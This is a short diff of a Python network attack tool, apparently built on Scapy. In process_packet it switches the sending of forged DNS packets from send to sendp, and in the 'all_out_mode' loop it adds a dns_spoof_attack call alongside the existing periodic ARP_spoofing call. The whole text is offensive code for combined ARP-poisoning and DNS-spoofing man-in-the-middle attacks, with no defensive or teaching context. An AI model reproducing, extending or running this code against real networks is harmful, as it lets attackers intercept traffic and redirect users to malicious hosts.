@@ -71,7 +71,7 @@ def process_packet(packet):
                 del packet[IP].len
                 del packet[UDP].chksum
                 del packet[UDP].len
-                send(packet, verbose=False)
+                sendp(packet, verbose=False)
 
             # Display complete DNS packet information
             
@@ -113,6 +113,7 @@ def all_out_mode():
     try:
         while True:
             ARP_spoofing()
+            dns_spoof_attack()
             time.sleep(20)
     except KeyboardInterrupt:
         pass
